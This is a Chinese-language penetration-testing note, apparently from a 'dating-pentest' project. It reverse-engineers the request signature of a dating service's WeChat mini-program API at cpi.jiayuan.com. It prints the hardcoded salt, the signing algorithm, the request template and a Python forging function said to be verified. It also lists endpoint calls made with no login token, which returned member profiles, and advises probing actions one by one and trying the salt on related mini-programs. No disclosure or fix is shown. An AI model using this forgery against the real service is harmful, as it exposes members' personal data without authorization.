算法来源：out/unpacked_all/_-430264554_43/app-service.js 的 getCpi() 与 Request()

  r = "x82ls87$!1"                              // 硬编码盐（明文在包内，不是会话密钥）
  n = JSON.stringify(p)                          // p = 业务参数对象，紧凑 JSON（无空格）
  i = parseInt(Date.now()/1000)                  // unix 秒
  s = md5(n)
  t = vrt 的 JSON 串
  u = md5(t + r + i + s.substr(8,16))            // substr(8,16) = 第 8 位起 16 个字符
  l = u.substr(8,16)
  _t = i + "_" + l
  stk = noToken ? "" : getStorageSync("AuthTokenCookie")

vrt 结构（可自定义 platform / deviceid，服务端不校验设备真实性）：
{"lang":"cn","brand":"JY","appver":"","channel":"famwxapp","platform":"xcx",
 "phoneModel":"","phoneOSVersion":"","deviceid":"","iosuuid":"",
 "plusChannel":"fam-wxxcx","plusCode":"1001","app":"fam","port":"","mac":"","imsi":"",
 "info":{"platform":null}}

请求（POST，form-urlencoded，注意 stk 可为空串 = 完全不带登录态）：
  POST /fam/<action> HTTP/1.1
  Host: cpi.jiayuan.com
  content-type: application/x-www-form-urlencoded; charset=utf-8
  referer: https://servicewechat.com/wx2173b36b723e174a/120/page-frame.html

  _t=<ts>_<16hex>&p=<urlencoded json>&vrt=<urlencoded json>&stk=

Python 实现（已验证可用，见 dating-pentest/round17/jy_sign.py）：

  import hashlib, json, time
  SALT = "x82ls87$!1"
  def sign(p_obj, vrt_json):
      pj = json.dumps(p_obj, separators=(',',':'), ensure_ascii=False)
      ts = int(time.time())
      s  = hashlib.md5(pj.encode()).hexdigest()
      u  = hashlib.md5((vrt_json + SALT + str(ts) + s[8:24]).encode()).hexdigest()
      return "%d_%s" % (ts, u[8:24]), pj

验证结果（空 stk，无 Cookie）：
  /fam/hn/list                p={"plat":"jy"}                      → 200  2879B  红娘列表
  /fam/hn/detail              p={"plat":"jy","hnID":"zhangwenwen"} → 200 10913B  红娘详情
  /fam/recommend/parents      p={"plat":"jy"}                      → 200 48975B  10 条会员档案
  /fam/cog/init               p={"plat":"jy"}                      → 200    78B
  /fam/user/me                                                   → 200 {"retCode":100001,"msg":"请求失败"}（该 action 仍要求真登录）

要点：
- _t 与会话/用户/设备**无关**，只依赖 (vrt, 盐, 时间, md5(p)) → 任何人可无限次重算；
- 不能"重放"旧 _t（有分钟级时效，返回 err_xccc），但"伪造"永远成立；
- 无 token 时仅部分 action 可用（返回 100001 的即需真登录），所以是**部分未授权**，
  不是"整套后台可登"。按 action 逐个试，不要当成万能绕过。
- 同类小程序（同一套 fam 网关）若复用该盐，同样适用。